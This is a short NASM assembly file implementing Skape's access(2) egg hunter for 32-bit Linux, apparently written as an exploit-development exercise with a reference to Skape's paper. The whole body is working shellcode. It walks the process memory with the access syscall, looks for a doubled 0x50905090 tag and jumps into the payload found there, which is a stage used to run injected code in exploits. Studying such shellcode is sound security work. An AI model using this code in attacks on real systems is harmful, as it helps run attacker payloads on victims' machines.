; Filename:    eggy.nasm
; Author:      Joshua Arnold - NASM; Skape egg hunter code
; Website:     https://huskersec.com
;
;
; Purpose:     Implementation of Skape's access(2) egg hunter
; Reference:   "Safely Searching Process Virtual Address Space"
; Reference:   http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf - Page 7-10 
; Explanation:
; Number of bytes: original <>; now <>

BITS 32
global _start			

section .text
_start:

	mov ebx,0x50905090    ;
	xor ecx,ecx
	mul ecx
jmpor:	
	or dx,0xfff
jmpinc:
	inc edx
	pusha
	lea ebx,[edx+0x4]
	mov al,0x21
	int 0x80
	cmp al,0xf2
	popa
	jz jmpor
	cmp [edx],ebx
	jnz jmpinc
	cmp [edx+0x4],ebx
	jnz jmpinc
	jmp edx
